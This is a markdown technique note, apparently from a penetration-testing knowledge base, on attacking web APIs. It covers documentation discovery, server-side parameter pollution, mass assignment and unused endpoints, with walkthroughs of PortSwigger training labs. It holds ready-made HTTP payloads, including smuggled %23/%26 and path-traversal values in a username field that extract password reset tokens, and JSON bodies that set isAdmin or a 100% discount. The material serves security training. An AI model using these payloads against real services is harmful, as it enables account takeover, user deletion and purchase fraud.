---
title: "API Testing"
type: technique
tags: [api, exploitation, web]
phase: exploitation
severity: high
date_created: 2026-05-13
date_updated: 2026-05-13
sources: [git-portswigger-all-labs]
---

# API Testing

## Overview

APIs (Application Programming Interfaces) enable systems and applications to communicate and share data. Due to their central role in dynamic websites, vulnerabilities in APIs can affect the confidentiality, integrity, and availability of core services.

API testing focuses on identifying and exploiting vulnerabilities in RESTful and JSON-based APIs, including:

- **Broken Object Level Authorization (BOLA)** — accessing resources belonging to other users via manipulated identifiers
- **Mass assignment (auto-binding)** — injecting hidden or privileged fields that software frameworks automatically bind to internal objects
- **Server-Side Parameter Pollution (SSPP)** — injecting extra parameters into internal API requests the server constructs from user input
- **Unused/undocumented endpoints** — endpoints exposed in the API but not surfaced in UI or docs, often with weaker access controls

Root cause: APIs expose application logic and data directly; developers frequently omit access controls, input validation, or method restrictions on individual endpoints, trusting that clients will only send "expected" requests.

## Enumeration

### Discovering API Endpoints

- Use **Burp Scanner** to crawl the application and surface API paths.
- Browse the application manually in **Burp's browser** to trigger API calls.
- Look for URL patterns indicating API endpoints (e.g., `/api/`, `/v1/`, `/internal/`).
- Inspect JavaScript files for references to undocumented endpoints — use the **JS Link Finder BApp** or manually review JS files in Burp.

### API Documentation Discovery

- Look for public or internal API documentation: Swagger UI, OpenAPI specs, Postman collections.
- Fuzz common documentation paths to discover auto-generated docs:

```
/api/
/api/swagger/v1
/api/openapi.json
/openapi.json
/api/docs
/api-docs
/swagger.json
/swagger/ui/index
```

- If you find a resource endpoint such as `/api/swagger/v1/users/123`, investigate the **base path** — strip path segments incrementally to discover root documentation.
- Consume both human-readable (Swagger UI) and machine-readable (JSON/YAML) formats to understand supported operations.

### Identifying Supported HTTP Methods

APIs may support multiple HTTP methods per endpoint. Test all of them:

```
GET    /api/tasks        -> Retrieves task list
POST   /api/tasks        -> Creates new task
PATCH  /api/tasks/1      -> Partially updates task 1
PUT    /api/tasks/1      -> Fully replaces task 1
DELETE /api/tasks/1      -> Deletes task 1
OPTIONS /api/tasks       -> Returns allowed methods header
```

- Send an `OPTIONS` request to enumerate what methods the endpoint accepts.
- Use **Burp Intruder's HTTP verbs list** to brute-force supported methods.
- Target low-priority objects when testing destructive methods to avoid unintended damage.

### Identifying Supported Content Types

Endpoints may behave differently depending on the `Content-Type` header sent. Changing the content type can:

- Trigger verbose errors that disclose internal field names or logic.
- Bypass input validation or WAF rules tied to a specific content type.
- Expose injection vectors (e.g., an endpoint secure against JSON injection may be vulnerable when receiving XML).

Technique: modify the `Content-Type` header and reformat the request body accordingly. Use the **Content Type Converter BApp** to automatically convert between XML and JSON.

### Identifying Hidden Parameters

- Compare fields returned in GET responses against fields accepted by PATCH/POST — extra fields in GET responses are candidates for hidden writable parameters.
- Mass assignment frameworks bind all request fields to the internal object; submitting undocumented fields may silently update privileged properties.

Example: a GET response reveals `isAdmin`, but the documented PATCH only mentions `username` and `email`. Submitting `isAdmin` in a PATCH request may elevate privileges.

## Attack Techniques

### 1. Exploiting API Documentation (Unauthorized Endpoint Access)

If the application exposes its API documentation or a redirect to it, an attacker can discover every supported endpoint and operation — including administrative ones not accessible through the UI.

**Steps:**
1. Interact with the API through the UI and capture traffic in Burp.
2. Identify the API base path from observed requests (e.g., `/api/user/wiener`).
3. Strip path components incrementally — removing the resource and identifier may trigger a redirect to the documentation root.
4. Review the documentation for sensitive operations (DELETE, admin actions).
5. Craft and send those requests directly, substituting target identifiers.

### 2. Server-Side Parameter Pollution (SSPP) — Query String

Occurs when user-supplied query parameters are reflected into an internal API call without sanitization. The attacker injects extra parameters into the internal request.

**Truncating query strings** — use URL-encoded `#` (`%23`) to cut off server-side parameters:

```
GET /userSearch?name=peter%23foo&back=/home
```

Server constructs:

```
GET /users/search?name=peter#foo&publicProfile=true
```

The `#` causes the server-side client to ignore `&publicProfile=true`, potentially bypassing access restrictions.

**Injecting invalid parameters** — use URL-encoded `&` (`%26`):

```
GET /userSearch?name=peter%26foo=xyz&back=/home
```

Server constructs:

```
GET /users/search?name=peter&foo=xyz&publicProfile=true
```

If the server returns an error such as `"Parameter is not supported"`, this confirms the injected parameter was processed.

**Injecting valid parameters** — inject known field names to probe what the internal API accepts:

```
GET /userSearch?name=peter%26email=foo&back=/home
```

**Overriding existing parameters** — duplicate parameter names to attempt value override:

```
GET /userSearch?name=peter%26name=carlos&back=/home
```

Backend parameter precedence varies by platform:

| Platform | Behaviour |
|---|---|
| PHP | Last value wins (`name=carlos`) |
| ASP.NET | Values concatenated (`peter,carlos`) |
| Node.js/Express | First value wins (`name=peter`) |

**Exploit:** override with a privileged username (e.g., `administrator`) to access or act as that account.

### 3. Server-Side Parameter Pollution (SSPP) — REST URL Path

RESTful APIs embed parameters in the URL path (e.g., `/api/users/123`). If user input is placed directly into a server-side path without sanitization, path traversal sequences can manipulate the target resource.

**Testing with path traversal:**

```
GET /edit_profile.php?name=peter%2f..%2fadmin
```

Server constructs:

```
GET /api/private/users/peter/../admin
```

If the backend normalizes `../`, this resolves to `/api/private/users/admin`.

**Progressive depth probing** — increment `../` sequences until you get a "Not found" or "Invalid route" error indicating you've navigated outside the API root, then add known filenames:

```
username=../../../../openapi.json%23
```

**Injecting a field parameter** once the internal route schema is known:

```
username=administrator/field/email%23
username=administrator/field/passwordResetToken%23
```

**Traversing API versions** — if a field is unsupported in the current version, navigate to a known older version:

```
username=../../v1/users/administrator/field/passwordResetToken%23
```

### 4. Finding and Exploiting Unused API Endpoints

Undocumented or unused endpoints may accept HTTP methods that have weaker or missing access controls. A PATCH or PUT endpoint on a product object may allow price manipulation if the developer only enforced authorization on GET.

**Steps:**
1. Browse the application and identify API calls in Burp.
2. Send an `OPTIONS` request to the endpoint to list allowed methods.
3. Try methods not normally used by the UI (e.g., PATCH, PUT on a read-only-looking endpoint).
4. If the server rejects the content type, switch to `application/json` (use Content Type Converter BApp).
5. Read error messages — they disclose expected parameters (e.g., `"'price' parameter missing in body"`).
6. Submit the disclosed parameter with a manipulated value (e.g., `price: 0`).

### 5. Mass Assignment

Mass assignment (auto-binding) occurs when a framework automatically maps all request body fields to an internal object, including fields the developer did not intend to be user-controlled.

**Identification:**
- Issue a GET request to the object endpoint and note all returned fields.
- Compare against what the documented write endpoint accepts.
- Fields present in GET but absent from documented PATCH/POST are candidates.

**Testing:**
1. Add the suspected hidden field with a valid value to a PATCH request and observe whether behaviour changes.
2. Add the field with an **invalid** value — if the application returns a different error, the field is being processed.
3. If both tests suggest the field is processed, send it with the privileged value.

**Example — privilege escalation:**

```json
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": true
}
```

**Example — price manipulation via discount injection:**

```json
{
    "chosen_discount": {
        "percentage": 100
    },
    "chosen_products": [
        {
            "product_id": "1",
            "quantity": 1
        }
    ]
}
```

## Payloads

**Query string truncation via `%23`:**

```
GET /userSearch?name=administrator%23&back=/home
```

**Query string parameter injection via `%26`:**

```
GET /userSearch?name=peter%26foo=xyz&back=/home
GET /userSearch?name=peter%26email=foo&back=/home
GET /userSearch?name=peter%26name=administrator&back=/home
```

**SSPP — field extraction via query string:**

```
POST /forgot-password
username=administrator%26field=reset_token%23
```

**REST path traversal probes:**

```
username=./administrator
username=../administrator
username=../../administrator
username=../../../../openapi.json%23
username=../../../../%23
```

**REST path — field injection:**

```
username=administrator/field/email%23
username=administrator/field/passwordResetToken%23
username=../../v1/users/administrator/field/passwordResetToken%23
```

**Mass assignment — privilege escalation:**

```json
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": true
}
```

**Mass assignment — invalid value probe (confirms field is processed):**

```json
{
    "username": "wiener",
    "email": "wiener@example.com",
    "isAdmin": "foo"
}
```

**Mass assignment — checkout discount injection:**

```json
{
    "chosen_discount": {
        "percentage": 100
    },
    "chosen_products": [
        {
            "product_id": "1",
            "quantity": 1
        }
    ]
}
```

**Password reset token extraction (JS source reveal):**

```javascript
const resetToken = urlParams.get('reset-token');
if (resetToken) {
    window.location.href = `/forgot-password?reset_token=${resetToken}`;
}
```

**Using the extracted token:**

```
GET /forgot-password?reset_token=<TOKEN>
```

## Tools

### Burp Suite

- **Burp Scanner** — crawl application to surface API endpoints automatically.
- **Burp Repeater** — manually replay and modify API requests; observe error messages and field behavior.
- **Burp Intruder** — brute-force HTTP methods (use HTTP verbs wordlist) and fuzz parameter names/values.
- **Burp Browser** — browse the application to trigger API calls and populate Proxy history.
- **OPTIONS request** — send to any endpoint to enumerate allowed HTTP methods via `Allow` response header.

### Burp BApps (Extensions)

- **JS Link Finder BApp** — extracts URLs and API endpoint references from JavaScript files in scope.
- **Content Type Converter BApp** — automatically converts request body between JSON and XML formats; useful for testing content-type-specific behavior and bypasses.

### Documentation Fuzzing

Common paths to fuzz for API documentation:

```
/api/swagger/v1
/api/swagger/v2
/api/openapi.json
/openapi.json
/swagger.json
/swagger/ui/index
/api-docs
/api/docs
/v1/docs
```

## PortSwigger Labs

### Apprentice

#### Lab 1 — Exploiting an API endpoint using documentation

**Goal:** Delete the user `carlos` by discovering the API documentation and using an undocumented DELETE endpoint.

1. Log in as `wiener:peter` and navigate to the account settings page.
2. Change the email address and capture the `PATCH /api/user/wiener` request in Burp.
3. In Burp Repeater, remove `user/wiener` from the path, leaving only `/api/`, and send the request.
4. Observe that the server returns a `302` redirect; follow the redirect to reach the REST API documentation page.
5. The documentation reveals a `DELETE /api/user/{username}` endpoint.
6. Send a `DELETE` request to `/api/user/carlos`.
7. Confirm carlos's account is deleted — lab solved.

### Practitioner

#### Lab 2 — Exploiting server-side parameter pollution in a query string

**Goal:** Exploit SSPP in the forgot-password flow to retrieve the administrator's password reset token and delete `carlos`.

1. Navigate to the login page and click "Forgot password".
2. Submit a username and capture the POST request to `/forgot-password` in Burp.
3. Set `username=administrator` — confirm a 200 response indicating the account exists.
4. Append `%23` to the username (`username=administrator%23`) — observe a changed response hinting at a `field` parameter.
5. Inject `%26a=b` (`username=administrator%26a=b`) — if the server responds with `"Parameter is not supported"`, the backend processes injected parameters.
6. Inject `%26field=test%23` to probe valid field names.
7. Review the JavaScript source of `/forgot-password` — identify the hidden parameter name `reset_token` (or `passwordResetToken`) referenced in client-side JS:

```javascript
const resetToken = urlParams.get('reset-token');
if (resetToken) {
    window.location.href = `/forgot-password?reset_token=${resetToken}`;
}
```

8. Submit `username=administrator%26field=reset_token%23` — the response includes the token value.
9. Send `GET /forgot-password?reset_token=<TOKEN>` to load the password reset page.
10. Set a new password for administrator and log in.
11. Navigate to the Admin panel and delete user `carlos` — lab solved.

#### Lab 3 — Finding and exploiting an unused API endpoint

**Goal:** Obtain the leather jacket for free by manipulating the price via an undocumented PATCH endpoint.

1. Log in as `wiener:peter`.
2. Browse to the product page for the leather jacket; attempt to purchase it — insufficient credit.
3. Add the jacket to the cart; capture the API request that fires (e.g., `POST /api/products/1/price` or similar).
4. Send an `OPTIONS` request to the same endpoint to enumerate supported methods — note that PATCH/PUT may be listed.
5. Send the request with the `PATCH` method; the server may respond with `"Only 'application/json' Content-Type is supported"`.
6. Add the `Content-Type: application/json` header (use Content Type Converter BApp if needed) and resend.
7. The server responds with `"'price' parameter missing in body"` — this reveals the expected parameter.
8. Send a PATCH request with `{"price": 0}` in the body.
9. Confirm the product price on the storefront is now $0.
10. Complete the purchase — lab solved.

#### Lab 4 — Exploiting a mass assignment vulnerability

**Goal:** Obtain the leather jacket for free by injecting a discount percentage into the checkout API.

1. Log in as `wiener:peter`.
2. Add the leather jacket to the cart and proceed to checkout.
3. Capture the POST request sent to `/api/checkout` in Burp.
4. Send an `OPTIONS` request to `/api/checkout` — confirm GET and POST are supported.
5. Issue a GET request to `/api/checkout` — observe the response JSON structure, which reveals a `chosen_discount` object with a `percentage` field not present in the normal checkout POST body.
6. Craft a POST request to `/api/checkout` with the discount injected:

```json
{
    "chosen_discount": {
        "percentage": 100
    },
    "chosen_products": [
        {
            "product_id": "1",
            "quantity": 1
        }
    ]
}
```

7. Send the request — receive a `201 Created` response.
8. Open the checkout in the original browser session — the 100% discount is applied and the jacket costs $0.
9. Complete the purchase — lab solved.

### Expert

#### Lab 5 — Exploiting server-side parameter pollution in a REST URL

**Goal:** Exploit SSPP in the REST URL path to retrieve the administrator's password reset token and delete `carlos`.

1. Navigate to the login page; click "Forgot password".
2. Submit `administrator` as the username and capture the request in Burp — confirm a 200 response.
3. Probe whether user input is placed in a URL path by submitting `./administrator` — if the server returns the same response as submitting `administrator`, the input is likely appended to a path.
4. Submit `../administrator` — an "Invalid route" error confirms the path traversal is processed.
5. Incrementally increase depth (`../../`, `../../../`, `../../../../`) until you get a "Not found" response, indicating you've navigated outside the API root.
6. At the depth that returned "Not found", append a common API definition filename:

```
username=../../../../openapi.json%23
```

7. The error response reveals an internal route template:

```
/api/internal/v1/users/{username}/field/{field}
```

8. Use this to inject a `field` sub-path:

```
username=administrator/field/email%23
```

Confirm the server returns the administrator's email — field injection is working.

9. Identify the reset token parameter name from the JavaScript source of `/forgot-password` (look for `passwordResetToken`).
10. Submit:

```
username=administrator/field/passwordResetToken%23
```

If this returns an error about the API version not supporting the parameter, traverse to the correct version:

```
username=../../v1/users/administrator/field/passwordResetToken%23
```

11. The response contains the password reset token.
12. Send `GET /forgot-password?passwordResetToken=<TOKEN>` to load the reset page.
13. Set a new password and log in as administrator.
14. Navigate to the Admin panel and delete user `carlos` — lab solved.
